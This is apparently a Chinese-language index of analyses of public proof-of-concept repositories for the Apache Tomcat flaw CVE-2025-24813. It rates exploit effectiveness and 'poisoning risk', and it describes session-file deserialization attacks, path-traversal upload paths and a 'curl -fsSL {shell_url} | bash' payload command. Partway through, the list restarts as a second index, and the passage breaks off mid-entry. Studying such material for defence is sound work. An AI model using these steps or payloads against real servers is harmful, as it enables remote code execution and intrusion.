1.  **前提条件：** 确保目标 Tomcat 服务器满足漏洞利用的条件，特别是启用了默认 Servlet 的写入功能和 partial PUT。
2.  **确定目标 URL 和会话 ID：** 找到 Tomcat 服务器的 uploads 目录和目标应用程序使用的会话 ID。session id可以从服务器获取，或者脚本中指定，上传的session文件名由此决定。
3.  **生成 Payload：** 使用脚本提供的 `generate_ysoserial_payload` 或 `generate_java_payload` 函数生成包含恶意命令的 payload。
4.  **上传 Payload：** 使用 `upload_and_verify_payload` 函数将生成的 payload 上传到 Tomcat 服务器的会话目录。
5.  **触发反序列化：** 脚本通过发送带有特定 Cookie 的 GET 请求来触发反序列化。如果一切顺利，服务器将执行 payload 中的恶意命令。

**项目地址:** [sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #45

**来源**: [CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md](../2025/CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #46

**来源**: [CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md](../2025/CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价性漏洞/远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2

**利用条件:** 需要满足以下条件：默认Servlet的写入已启用（默认禁用）、支持部分PUT（默认启用）、应用程序使用Tomcat基于文件的会话持久性，默认存储位置、应用程序包含可在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞，源于对包含特殊字符（特别是分号“;”）的 URL 的解析不一致。这种不一致允许攻击者构造恶意 URL，该 URL 被安全检查组件和文件服务组件以不同的方式解释。如果启用了`default` servlet 的写权限和启用了`partial PUT`，并且使用了存在反序列化漏洞的依赖， 攻击者可以通过上传恶意文件（例如，JSP webshell），然后利用构造的包含 `..;/` 的 URL 来绕过安全限制，最终在服务器上实现远程代码执行(RCE)。

**有效性评估：**

根据漏洞描述和搜索结果，此漏洞已在野外被积极利用。漏洞利用代码中的 `README.md` 文件详细描述了漏洞原理、攻击链和利用方式，表明该 PoC 代码具备一定的有效性。

**投毒风险评估：**

分析了漏洞利用代码目录下的 `LICENSE` 和 `README.md` 文件，未发现明显的恶意代码。但任何 PoC 代码都存在潜在风险，不应在生产环境直接运行。 无法保证作者没有在其他文件中添加隐藏的后门代码。因此, 投毒风险评估为10%。

**漏洞利用方式：**

1.  **上传恶意 Payload：** 攻击者通过 Web 应用程序的文件上传功能，将恶意的 JSP Web Shell（例如 `shell.jsp`）上传到已知的非可执行目录，例如 `/uploads`。
2.  **发现Endpoint：** 攻击者识别服务器上一个合法的，可执行的 JSP 端点，例如 `/user/profile.jsp`。
3.  **构造和执行攻击URL：** 攻击者构造最终 URL，其中包含 `..;/` 序列来绕过安全检查。例如：`/app/user/..;/uploads/shell.jsp`。当服务器接收到此请求时，安全管理器可能只检查 `/app/user/` 的权限，而文件系统解析器会处理 `../` 并执行 `/uploads/shell.jsp` 中的代码。

**修复建议：**

*   升级到 Apache Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
*   禁用 default servlet 的写权限，除非绝对必要。
*   审查并更新应用程序依赖，移除存在反序列化漏洞的库。

**项目地址:** [threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat](https://github.com/threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #47

**来源**: [CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：1. writes enabled for the default servlet (默认禁用); 2. 支持 partial PUT (默认启用); 3. 使用 Tomcat 的 file based session persistence 和默认存储位置; 4. 应用包含一个可能被用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 远程代码执行漏洞，利用了 Tomcat 处理部分 PUT 请求的方式。攻击者可以通过上传恶意构造的文件（利用 Ysoserial 生成反序列化 payload）到 Tomcat 服务器，然后通过 GET 请求触发反序列化，从而执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索引擎结果（Rapid7, GreyNoise, socprime 等）以及提供的 POC 代码，可以判断该漏洞是有效的，并且已经被观察到在野利用。POC 代码通过生成多种 Ysoserial payload 并尝试上传，增加了漏洞利用成功的概率。

**投毒风险分析：**

分析提供的 POC 代码，发现其主要功能是利用 ysoserial 生成反序列化 payload，然后通过 PUT 和 GET 请求触发漏洞。代码本身没有明显的恶意行为，例如向其他服务器发送信息或篡改本地文件。主要风险在于使用未经验证的第三方库（ysoserial），这本身可能存在安全风险，但是这是漏洞利用本身的一部分，而不是作者额外添加的恶意代码。

评估投毒风险较低，约为5%。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 服务器需要满足特定配置条件，包括开启了 default servlet 的写入权限，支持 partial PUT，并且应用使用了 Tomcat 的文件会话持久化功能，且包含可被利用的反序列化库。
2.  **生成 Payload：** 使用 ysoserial 工具生成包含恶意命令的反序列化 payload。POC 代码支持批量生成不同 gadget chain 的 payload，提高成功率。
3.  **PUT 请求：** 通过 PUT 请求，将生成的 payload 分段上传到目标 Tomcat 服务器。利用 Content-Range 头部模拟 partial PUT 请求。
4.  **GET 请求：** 通过 GET 请求，触发 Tomcat 对上传文件的反序列化操作，从而执行恶意代码。
5.  **执行命令：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [tonyarris/CVE-2025-24813-PoC](https://github.com/tonyarris/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #48

**来源**: [CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md](../2025/CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入(disabled by default), 支持partial PUT(enabled by default), application 使用了Tomcat基于文件的session持久化，使用了默认的存储位置，并且application包含可被反序列化攻击利用的library。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，可能导致远程代码执行和/或信息泄露。该漏洞的根源在于对文件名的处理方式，特别是内部点（'file.Name'）。

**漏洞利用方式分析：**

根据漏洞库信息和搜索结果，该漏洞存在两种利用方式：

1.  **信息泄露/恶意内容注入：** 如果满足以下条件，攻击者能够查看敏感文件或注入恶意内容：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   目标URL是公共上传URL的子目录。
    *   攻击者知道敏感文件名。
    *   使用 partial PUT 上传敏感文件。

2.  **远程代码执行（RCE）：** 如果满足以下条件，攻击者能够执行任意代码：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   应用程序使用Tomcat的基于文件的session持久化，并使用默认存储位置。
    *   应用程序包含一个可以用于反序列化攻击的library。

**POC 代码分析：**

POC代码`CVE_2025_24813.py`实现了以下功能：

1.  **检查Servlet是否可写：** 使用PUT请求向目标URL上传文件，检查HTTP响应状态码，以确定服务器是否允许写入。
2.  **生成ysoserial payload：** 使用ysoserial工具生成反序列化payload，需要指定命令、ysoserial路径和gadget。
3.  **生成Java payload：**  生成一个简单的java文件, 然后通过javac编译为class文件, 再打包为jar文件。
4.  **上传和验证payload：** 上传生成的payload到Tomcat服务器, 利用路径穿越漏洞，覆盖session文件，从而执行代码。

**有效性评估：**

根据搜索结果，CVE-2025-24813漏洞正在被积极利用。POC代码涵盖了漏洞利用的关键步骤，包括写入性验证、payload生成和上传，因此可以认为是有效的，但利用成功与否取决于目标环境是否满足利用条件。

**投毒风险评估：**

通过分析POC代码，发现存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖外部工具ysoserial：**  POC代码依赖于ysoserial工具生成反序列化payload。虽然ysoserial是一个常用的漏洞利用工具，但如果用户下载了被篡改的ysoserial版本，可能会执行恶意代码。虽然POC本身没有直接植入恶意代码，但依赖的外部资源存在被投毒的风险。
2.  **执行任意命令：**  该脚本允许执行任意命令。如果攻击者控制了用户运行脚本的环境，可以修改脚本，执行恶意的系统命令，从而控制目标系统。

综合考虑，该POC代码的投毒风险较低，约为5%。大部分代码是用于漏洞利用，风险主要来源于对外部依赖的信任和对执行环境的控制。


**项目地址:** [u238/Tomcat-CVE_2025_24813](https://github.com/u238/Tomcat-CVE_2025_24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #49

**来源**: [CVE-2025-24813-uzairhaider502_CVE-2025-24813.md](../2025/CVE-2025-24813-uzairhaider502_CVE-2025-24813.md)

# CVE-2025-24813

> 📦 该CVE有 **52** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-24813-137f_Poc-CVE-2025-24813.md](../2025/CVE-2025-24813-137f_Poc-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 开启Partial PUT (默认开启), 应用使用基于文件的session持久化(默认位置), 应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，利用了路径等价性（内部点，例如 `file.Name`）结合启用了写入功能的默认 Servlet 和 Partial PUT 功能。该漏洞可能导致远程代码执行（RCE）、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用方式:**

1.  **前提条件:** 漏洞利用需要满足以下条件：
    *   默认 Servlet 开启写入 (disabled by default).
    *   支持 Partial PUT (enabled by default).
    *   对于RCE，应用需要使用 Tomcat 基于文件的 session 持久化，并且包含一个可以被反序列化攻击利用的库（例如，存在于classpath中的commons-collections）。
    *   对于信息泄露/文件篡改，需要攻击者了解敏感文件的上传目标 URL 位于公共上传目标 URL 的子目录下，且攻击者需要知道上传的敏感文件名，且敏感文件通过partial PUT上传。
2.  **漏洞利用步骤:**
    *   **获取 Session ID:** 攻击者首先需要获取一个有效的 JSESSIONID，可以通过访问 `/index.jsp` 获取，如果无法获取则使用默认值。
    *   **测试 PUT 方法:** 攻击者发送一个 PUT 请求来确认目标服务器是否允许使用 `Content-Range` 进行部分写入。
    *   **生成 Payload:**  攻击者使用 `ysoserial` 或者 Java 代码生成一个恶意的序列化对象。`ysoserial` 通过指定的 gadget（例如 `CommonsCollections6`）来执行命令。也可以生成一个包含恶意命令执行的Java .jar文件。
    *   **上传 Payload:**  攻击者利用路径遍历将 payload 上传到 Tomcat 的 session 目录。例如，`/uploads/../sessions/{JSESSIONID}.session`。
    *   **触发执行:**  攻击者使用包含恶意 JSESSIONID 的请求来访问应用程序。Tomcat 将会反序列化该 session 文件，从而执行攻击者注入的命令。

**有效性:**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞的 POC 代码**有效**。搜索结果中提到了该漏洞已被积极利用。提供的 POC 代码包含利用该漏洞进行 RCE 的 Python 脚本，并提供了详细的利用步骤和参数说明。

**投毒风险:**

评估提供的 POC 代码，投毒风险较低，约为 **10%**。主要考虑因素如下：

*   **代码结构:** 代码结构较为清晰，主要分为获取 Session ID、验证 PUT 方法、生成 Payload 和发送 Payload 等几个模块。
*   **依赖项:**  代码依赖 `ysoserial.jar`，这本身是一个已知的漏洞利用工具，如果攻击者替换了 `ysoserial.jar` 文件，则可能引入恶意代码。此外，java payload方式需要服务器具有java编译环境。
*   **潜在风险:**  `java_payload` 函数中使用 `Runtime.getRuntime().exec(c)` 直接执行命令，如果命令字符串 `cmd` 构造不当，可能会存在命令注入的风险。
*   **作者声明:**  README 文件中包含免责声明，说明该代码仅用于教育目的，这在一定程度上降低了作者进行恶意投毒的可能性。

总的来说，虽然代码本身看起来没有明显的恶意行为，但仍然需要谨慎使用，并确保从可信的来源获取 `ysoserial.jar`，并仔细检查命令字符串，避免引入额外的安全风险。 java payload方式需要服务器具有java编译环境,具有一定局限性。

**项目地址:** [137f/Poc-CVE-2025-24813](https://github.com/137f/Poc-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #2

**来源**: [CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露，文件被篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足特定配置条件，包括启用Default Servlet的写入功能，启用partial PUT支持，存在安全敏感文件上传的目标URL位于公共上传目标URL的子目录中，攻击者已知安全敏感文件的名称，以及安全敏感文件通过partial PUT上传。或者，启用Default Servlet的写入功能，启用partial PUT支持，应用程序使用Tomcat基于文件的会话持久性与默认存储位置，应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息，CVE-2025-24813 涉及 Apache Tomcat 的路径等效问题，可能导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。利用条件包括Default Servlet启用了写入，支持partial PUT，以及应用程序的特定配置。搜索引擎结果显示，该漏洞已被公开并被积极利用。

提供的 POC 代码尝试利用该漏洞。它首先使用 `argparse` 处理目标 URL 参数。然后，它包含一段 base64 编码的 payload，该 payload 是一个经过序列化的 Java 对象，旨在执行命令 `touch /tmp/RCE-success`。  该脚本将解码后的payload保存到`decoded_chain.bin`文件中。 然后，使用 `requests.put` 函数，通过构造包含 'Content-Range' 头部的 PUT 请求，利用 Tomcat 的 partial PUT 功能，将payload上传到目标服务器。PUT请求的目标URL是`TARGET_IP/payload.session`。脚本上传完成后删除临时文件。 最后使用Cookie进行getSession。

**有效性评估：** POC 的有效性取决于目标 Tomcat 服务器是否满足漏洞利用的全部条件。如果 Default Servlet 的写入已启用，并且启用了 partial PUT 支持，并且满足其他条件，则 POC 可能有效。

**投毒风险评估：** 仔细检查提供的 POC 代码，没有发现明显的投毒代码。该代码旨在利用已知的 Tomcat 漏洞，而不是在目标系统上植入后门或执行恶意操作。 代码中包含的base64编码的payload部分是最有可能存在风险的部分，但是payload中的命令是`touch /tmp/RCE-success`，该命令仅仅是创建一个文件，用于验证漏洞是否存在，并非恶意操作。

**利用方式总结：**

1.  **条件确认:** 确认目标 Tomcat 服务器启用了 Default Servlet 的写入功能，并启用了 partial PUT 支持，以及是否满足其他相关条件。
2.  **Payload 生成:**  生成一个恶意 Java 序列化对象，该对象可以执行任意代码，或者读取敏感文件。
3.  **Partial PUT 上传:**  使用 HTTP PUT 请求，通过设置 `Content-Range` 头部，将恶意 payload 分块上传到目标服务器上的特定路径（例如，`payload.session`）。
4.  **触发反序列化：**  Tomcat 尝试反序列化上传的文件，从而触发恶意代码的执行。


**项目地址:** [Alaatk/CVE-2025-24813-POC](https://github.com/Alaatk/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #3

**来源**: [CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md](../2025/CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：默认Servlet开启写入 (默认关闭)，支持Partial PUT (默认开启)，存在安全敏感文件的目标URL是公共上传目标URL的子目录，攻击者知晓敏感文件名，安全敏感文件通过Partial PUT上传，或应用程序使用Tomcat文件会话持久性（默认位置），应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞。该漏洞允许攻击者通过精心构造的包含内部点（file.Name）的文件名，利用默认Servlet中启用的写入功能和Partial PUT支持，进行远程代码执行、信息泄露和恶意内容注入。根据漏洞描述，攻击成功的关键在于Tomcat的配置以及应用程序是否使用了易受攻击的组件。

**有效性：** 从搜索结果来看，该漏洞已被确认存在并且有在野利用。但是，漏洞利用需要满足多个非默认配置条件，因此并非所有Tomcat实例都易受攻击。提供的POC代码 `/tmp/9a20e2370d216dc00af3f4d6145c600e/README.md` 内容过于简单，仅包含CVE编号，并不能直接用于漏洞利用，需要根据具体情况编写特定的利用代码，例如构造恶意的PUT请求。

**投毒风险：** 提供的POC代码非常简单，主要就是包含 CVE-2025-24813 的 README.md 文件。因此，投毒风险很低，但是不排除作者在其他相关文件中隐藏恶意代码的可能性，只是没有在此次提交中呈现，考虑到文件数量极少,故判断存在10%的投毒风险。

**利用方式：** 漏洞利用主要通过以下步骤：

1.  **利用Partial PUT上传恶意文件：** 攻击者构造包含内部点的文件名，并通过Partial PUT请求将其上传到目标服务器。
2.  **绕过路径检查：** 由于路径等价性问题，Tomcat可能无法正确处理包含内部点的文件名，导致绕过路径检查。
3.  **信息泄露/恶意内容注入：** 如果目标是信息泄露或恶意内容注入，攻击者需要知道目标敏感文件的名称和路径，然后通过覆盖或修改该文件来实现目的。
4.  **远程代码执行：** 如果应用程序使用了Tomcat的文件会话持久性，并且包含可用于反序列化攻击的库，攻击者可以利用该漏洞将恶意序列化对象写入会话文件，从而实现远程代码执行。攻击者可能会覆盖session文件，然后触发反序列化。

**总结：** CVE-2025-24813 是一个高危漏洞，但是利用条件较为苛刻。 提供的POC代码过于简单，无法直接用于攻击，需要根据目标环境进行定制。在实际环境中，需要仔细评估Tomcat的配置和应用程序的安全性，以确定是否存在被利用的风险。同时需要关注针对该漏洞的攻击尝试并及时采取缓解措施，例如禁用默认Servlet的写入功能或升级到修复版本。

**项目地址:** [AlperenY-cs/CVE-2025-24813](https://github.com/AlperenY-cs/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #4

**来源**: [CVE-2025-24813-AsaL1n_CVE-2025-24813.md](../2025/CVE-2025-24813-AsaL1n_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危 (取决于配置和利用方式，可能导致RCE、敏感信息泄露或文件内容篡改)

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** RCE需要满足以下条件：writes enabled for default servlet, support for partial PUT, 使用Tomcat文件session持久化默认位置, 应用包含可被反序列化攻击利用的库。信息泄露/内容篡改需要满足以下条件：writes enabled for default servlet, support for partial PUT, security sensitive上传URL是公共上传URL的子目录, 攻击者知道security sensitive文件的名字, security sensitive文件也是通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是一个Apache Tomcat中的路径等价性漏洞，源于对文件名中内部点（'file.Name'）处理不当。根据漏洞描述和搜索结果，此漏洞在特定配置下可能导致远程代码执行（RCE）、信息泄露或恶意内容被添加到上传文件中。

**有效性：**
根据搜索引擎结果和漏洞描述，该漏洞已被积极利用。提供的PoC代码利用了Tomcat的partial PUT特性以及session持久化机制（在满足一定条件下），尝试通过上传恶意序列化数据来实现RCE。

**利用方式：**
1.  **前提条件：**
    *   Tomcat的default servlet需要开启写入功能（默认关闭）。
    *   需要启用partial PUT支持（默认开启）。
    *   （RCE）应用使用Tomcat的文件session持久化，且为默认存储位置。
    *   （RCE）应用包含可被反序列化攻击利用的库，例如存在fastjson, jackson等。
    *   （信息泄露/内容篡改）存在安全敏感文件上传URL是公共上传URL的子目录， 且攻击者知道该敏感文件名。
2.  **攻击步骤：**
    *   攻击者构造一个恶意的序列化对象，对其进行Base64编码（PoC中`-d/--data` 参数）。
    *   攻击者指定目标URL（PoC中`-u/--url` 参数）。
    *   PoC脚本首先向目标URL发送PUT请求，其中`Content-Range`头指定了上传的范围，利用Tomcat的partial PUT特性。
    *   如果服务器返回409状态码，则表示partial PUT已成功处理。
    *   之后，PoC脚本会发送GET请求，并携带包含恶意序列化数据的JSESSIONID cookie（`.{random_str}`）。
    *   Tomcat反序列化session数据，从而触发RCE (如果满足RCE条件)。

**投毒风险：**
分析提供的PoC代码和Readme，可以发现：
*   脚本本身的功能是利用漏洞进行攻击。
*   脚本中没有发现明显的恶意代码，例如植入后门、篡改系统文件等。
*   脚本需要用户提供Base64编码的序列化数据，这意味着攻击者需要自行生成payload，脚本只是负责发送payload。
*   Readme中指明了利用方式及所需条件，较为详细。

因此，该仓库中存在作者隐藏的恶意代码的可能性较低，但不能完全排除。投毒风险评估为 10%。风险主要在于用户可能下载了被篡改过的poc，或者运行了来历不明的payload, 这些payload可能包含恶意行为。

**项目地址:** [AsaL1n/CVE-2025-24813](https://github.com/AsaL1n/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #5

**来源**: [CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露和文件被恶意修改

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (Tomcat 默认支持), 文件会话持久化启用 (context.xml 配置 PersistentManager 和 FileStore), 存在反序列化利用链 (类路径下包含存在漏洞的库)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，该漏洞源于 'file.Name' (内部点) 的处理不当。如果满足以下所有条件，则可能导致远程代码执行，信息泄露或文件篡改：

1.  **DefaultServlet 写入功能启用：** 必须在 `web.xml` 中配置 `readonly=false`，允许 DefaultServlet 写入文件。
2.  **Partial PUT 请求支持：** Tomcat 默认支持分块上传，允许攻击者通过分块上传恶意文件。
3.  **文件会话持久化启用：** 需要在 `context.xml` 中配置 `PersistentManager` 和 `FileStore`，启用基于文件的会话存储。
4.  **存在反序列化利用链：** 类路径下需要包含存在漏洞的库（例如，`commons-collections-3.2.1.jar`），使得攻击者可以通过反序列化漏洞执行任意代码。
5.  **信息泄露/文件篡改的先决条件:** 除了上述条件外，还需要满足：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**利用方式：**

1.  攻击者首先利用 Partial PUT 请求上传一个恶意构造的序列化对象，该对象包含一个反序列化利用链（例如，使用 Commons Collections）。
2.  由于启用了 DefaultServlet 的写入功能，恶意文件可以被写入到 Tomcat 的会话存储目录中。
3.  当 Tomcat 尝试反序列化该会话时，由于存在利用链，攻击者可以执行任意代码。
4. 若目标满足信息泄露/文件篡改的先决条件,攻击者可以通过构造恶意的Partial PUT请求，利用路径等价绕过限制，最终实现信息泄露或者文件篡改

**投毒风险分析：**

该POC代码提供了一个 Docker Compose 文件，用于搭建易受攻击的 Tomcat 环境。该环境配置了必要的组件（DefaultServlet 写入，Partial PUT，文件会话持久化），并且包含了一个 Commons Collections 库，可以用于反序列化攻击。

代码本身看起来是直接了当的漏洞演示。投毒风险较低，但是使用该POC时仍需注意。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的利用代码来看，该漏洞已经确认被利用，并且相关的利用方式和利用条件已经比较清晰。提供的POC代码针对的是 RCE 部分，有效性较高，但成功利用取决于是否满足所有前提条件。

**项目地址:** [B1gN0Se/Tomcat-CVE-2025-24813](https://github.com/B1gN0Se/Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #6

**来源**: [CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence/Partial PUT RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/Partial PUT远程代码执行/信息泄露

